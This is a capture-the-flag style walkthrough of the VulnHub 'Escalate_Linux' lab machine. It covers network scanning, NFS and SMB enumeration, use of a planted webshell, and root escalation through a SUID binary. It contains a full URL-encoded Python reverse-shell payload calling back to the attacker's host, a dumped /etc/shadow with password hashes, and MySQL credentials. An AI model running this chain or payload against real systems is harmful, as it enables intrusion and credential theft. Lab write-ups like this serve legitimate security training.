# Escalate_Linux | VulnHub
https://www.vulnhub.com/entry/escalate_linux-1,323/

### 1. Scan
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sn 192.168.34.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 19:59 EST
Nmap scan report for 192.168.34.1
Host is up (0.00071s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.34.2
Host is up (0.00028s latency).
MAC Address: 00:50:56:EA:B5:2C (VMware)
Nmap scan report for 192.168.34.144
Host is up (0.0010s latency).
MAC Address: 00:0C:29:DA:13:FF (VMware)
Nmap scan report for 192.168.34.254
Host is up (0.00032s latency).
MAC Address: 00:50:56:E4:7A:F5 (VMware)
Nmap scan report for 192.168.34.141
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.21 seconds
                                                                                                                                                                                                                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -A -p- -T4 192.168.34.144
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 19:59 EST
Nmap scan report for 192.168.34.144
Host is up (0.00094s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44247/udp   mountd
|   100005  1,2,3      56193/tcp   mountd
|   100005  1,2,3      56701/tcp6  mountd
|   100005  1,2,3      58182/udp6  mountd
|   100021  1,3,4      39883/tcp   nlockmgr
|   100021  1,3,4      43267/tcp6  nlockmgr
|   100021  1,3,4      47137/udp   nlockmgr
|   100021  1,3,4      50613/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     3 (RPC #100227)
39883/tcp open  nlockmgr    1-4 (RPC #100021)
44997/tcp open  mountd      1-3 (RPC #100005)
45095/tcp open  mountd      1-3 (RPC #100005)
56193/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:DA:13:FF (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: LINUX

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: osboxes
|   NetBIOS computer name: LINUX\x00
|   Domain name: \x00
|   FQDN: osboxes
|_  System time: 2021-03-05T20:00:06-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-06T01:00:06
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.94 ms 192.168.34.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
```
The machine is running an Apache web server, RPC, SMB and NFS.

### 2. Look at NFS
List accessible shares.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ showmount -e 192.168.34.144        
Export list for 192.168.34.144:
/home/user5 *
```
Mount and list the share.
```bash
┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ sudo mount -t nfs 192.168.34.144:/home/user5 /home/kali/Desktop/vhb/escalate

┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ ls -lha escalate

total 160K
drwxr-xr-x 22 1004 1004 4.0K Jun  4  2019 .
drwxr-xr-x  3 kali kali 4.0K Mar  5 20:09 ..
-rw-r--r--  1 1004 1004  124 Jun  4  2019 .asoundrc
-rw-r--r--  1 1004 1004  220 Jun  4  2019 .bash_history
-rw-r--r--  1 1004 1004  220 Jun  4  2019 .bash_logout
-rw-r--r--  1 1004 1004  949 Jun  4  2019 .bashrc
drwxr-xr-x 15 1004 1004 4.0K Jun  4  2019 .cache
drwxr-xr-x 20 1004 1004 4.0K Jun  4  2019 .config
drwxr-xr-x  3 1004 1004 4.0K Jun  4  2019 .dbus
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Desktop
-rw-r--r--  1 1004 1004   23 Jun  4  2019 .dmrc
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Documents
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Downloads
-rw-r--r--  1 1004 1004 9.2K Jun  4  2019 .face
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 .gconf
drwxr-xr-x 24 1004 1004 4.0K Jun  4  2019 .gimp-2.8
-rw-r--r--  1 1004 1004    0 Jun  4  2019 .gksu.lock
drwxr-xr-x  3 1004 1004 4.0K Jun  4  2019 .gnome
drwxr-xr-x  3 1004 1004 4.0K Jun  4  2019 .gnome2
drwxr-xr-x  3 1004 1004 4.0K Jun  4  2019 .gnupg
-rw-r--r--  1 1004 1004   20 Jun  4  2019 .gtk-bookmarks
-rw-r--r--  1 1004 1004  105 Jun  4  2019 .gtkrc-2.0
-rw-------  1 1004 1004 4.6K Jun  4  2019 .ICEauthority
drwxr-xr-x  3 1004 1004 4.0K Jun  4  2019 .local
-rwxrwxr-x  1 1004 1004   26 Jun  4  2019 ls
drwxr-xr-x  5 1004 1004 4.0K Jun  4  2019 .mozilla
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Music
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Pictures
-rw-r--r--  1 1004 1004  873 Jun  4  2019 .profile
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Public
-rwsr-xr-x  1 root root 8.2K Jun  4  2019 script
-rw-r--r--  1 1004 1004    0 Jun  4  2019 .sudo_as_admin_successful
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Templates
drwxr-xr-x  3 1004 1004 4.0K Jun  4  2019 .thumbnails
drwxr-xr-x  4 1004 1004 4.0K Jun  4  2019 .thunderbird
drwxr-xr-x  2 1004 1004 4.0K Jun  4  2019 Videos
-rw-r--r--  1 1004 1004   50 Jun  4  2019 .Xauthority
```
Some of the files are pretty interesting. There is a SUID binary with the owner as root, and an "ls" text file with the following content:
```bash
┌──(kali㉿kali)-[~/Desktop/vhb/escalate]
└─$ cat ls            
id
whoami
cat /etc/shadow
```

### 3. Look at SMB
List SMB shares:
```bash
┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ smbclient -U 'guest' -L \\192.168.34.144
Enter WORKGROUP\guest's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        liteshare       Disk      
        IPC$            IPC       IPC Service (Linux Lite Shares)
SMB1 disabled -- no workgroup available
```
Attempt to mount the share.
```bash
┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ sudo mount -t cifs -o user=guest //192.168.34.144/liteshare /mnt/smb                  
🔐 Password for guest@//192.168.34.144/liteshare:                          
mount error(13): Permission denied
Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
```
It appears to need a password. Tried with SMBClient to be sure.
```bash
┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ smbclient -U 'guest' \\\\192.168.34.144\\liteshare

Enter WORKGROUP\guest's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### 4. Check out website
The website is a blank default Apache2 Ubuntu webpage. Ran a dirbust from the webroot:
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ python3 dirsearch.py -u http://192.168.34.144 -x 403

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra_Tools/dirsearch/logs/errors-21-03-05_20-52-32.log

Target: http://192.168.34.144/
Output File: /home/kali/Extra_Tools/dirsearch/reports/192.168.34.144/_21-03-05_20-52-32.txt

[20:52:32] Starting: 
[20:52:51] 200 -   11KB - /index.html
[20:52:58] 200 -   29B  - /shell.php

Task Completed
```
A quick look at shell.php:
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ curl http://192.168.34.144/shell.php
/*pass cmd as get parameter*/
```
This looks like a webshell.
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ curl http://192.168.34.144/shell.php?cmd=whoami
user6
/*pass cmd as get parameter*/
```
It is.

### 5. Get a shell
Once I know I can pass commands through "cmd", I can get a reverse shell by requesting `http://192.168.34.144/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.34.141%22,9999));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27`.  
Catch the shell in nc:
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.141] from (UNKNOWN) [192.168.34.144] 57836
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash');"    
Welcome to Linux Lite 4.4 
 
Friday 05 March 2021, 21:12:48
Memory Usage: 341/985MB (34.62%)
Disk Usage: 5/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
 user6  / | var | www | html  id
uid=1005(user6) gid=1005(user6) groups=1005(user6)
```

### 6. Enumerate from foothold
By doing some more recursive ls from within the user folder I can see there are only a few (non-hidden) files that stand out as not defaults for a user.
The first of these is a file in user3's directory called "shell".
```bash
home | user3  file shell                                          
shell: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7bf25436e2dc7b583c76756f2753100d7b240130, not stripped

home | user3  ls -l shell                                
ls -l shell
-rwsr-xr-x 1 root root 8392 Jun  4  2019 shell
```

### 7. Escalate to root
I just run this binary to escalate to root.
```bash
 user6  / | home | user3  ./shell                                              
./shell
You Can't Find Me
Welcome to Linux Lite 4.4
 
You are running in superuser mode, be very careful.
 
Friday 05 March 2021, 21:24:09
Memory Usage: 347/985MB (35.23%)
Disk Usage: 5/217GB (3%)
 
 root  / | home | user3  whoami
whoami
root
 root  / | home | user3  cat /etc/shadow                                       
cat /etc/shadow
root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::
daemon:x:17995:0:99999:7:::
bin:x:17995:0:99999:7:::
sys:x:17995:0:99999:7:::
sync:x:17995:0:99999:7:::
games:x:17995:0:99999:7:::
man:x:17995:0:99999:7:::
lp:x:17995:0:99999:7:::
mail:x:17995:0:99999:7:::
news:x:17995:0:99999:7:::
uucp:x:17995:0:99999:7:::
proxy:x:17995:0:99999:7:::
www-data:x:17995:0:99999:7:::
backup:x:17995:0:99999:7:::
list:x:17995:0:99999:7:::
irc:x:17995:0:99999:7:::
gnats:x:17995:0:99999:7:::
systemd-timesync:x:17995:0:99999:7:::
systemd-network:x:17995:0:99999:7:::
systemd-resolve:x:17995:0:99999:7:::
syslog:x:17995:0:99999:7:::
_apt:x:17995:0:99999:7:::
messagebus:x:17995:0:99999:7:::
uuidd:x:17995:0:99999:7:::
lightdm:x:17995:0:99999:7:::
ntp:x:17995:0:99999:7:::
avahi:x:17995:0:99999:7:::
colord:x:17995:0:99999:7:::
dnsmasq:x:17995:0:99999:7:::
hplip:x:17995:0:99999:7:::
nm-openconnect:x:17995:0:99999:7:::
nm-openvpn:x:17995:0:99999:7:::
pulse:x:17995:0:99999:7:::
rtkit:x:17995:0:99999:7:::
saned:x:17995:0:99999:7:::
usbmux:x:17995:0:99999:7:::
geoclue:x:17995:0:99999:7:::
nobody:x:17995:0:99999:7:::
vboxadd:!:17995::::::
user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::
user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::
user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::
user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::
statd:*:18051:0:99999:7:::
user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::
user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::
mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::
user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::
user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::
```

## More findings
Logging into mysql:
```bash
 user6  / | home | user6  mysql -u root -p                                     
mysql -u root -p
Enter password: root

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.26-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

No entry for terminal type "XTERM";
using dumb terminal settings.
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| user               |
+--------------------+
5 rows in set (0.04 sec)

mysql> use user; show tables;
use user; show tables;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+----------------+
| Tables_in_user |
+----------------+
| user_info      |
+----------------+
1 row in set (0.00 sec)

mysql> describe user_info;
describe user_info;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| username | varchar(20) | YES  |     | NULL    |       |
| password | varchar(20) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
2 rows in set (0.02 sec)

mysql> select * from user_info;
select * from user_info;
+----------+-------------+
| username | password    |
+----------+-------------+
| mysql    | mysql@12345 |
+----------+-------------+
1 row in set (0.00 sec)
```
This gives me a new set of credentials: `mysql:mysql@12345`  

Additionally there is a crontab line running a script called "autoscript.sh".
```bash
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
This script creates a file in user4's home folder called abc.txt and then launches a bash interactive shell.
```bash
 user6  / | home | user6  cat /home/user4/Desktop/autoscript.sh
touch /home/user4/abc.txt
echo "I will automate the process"
bash -i

 user6  / | home | user6  ls -l /home/user4/abc.txt                            
-rw-r--r-- 1 root root 0 Mar  5 22:05 /home/user4/abc.txt
```
Because this cron job will run as root, any commands in autorun.sh will execute as root.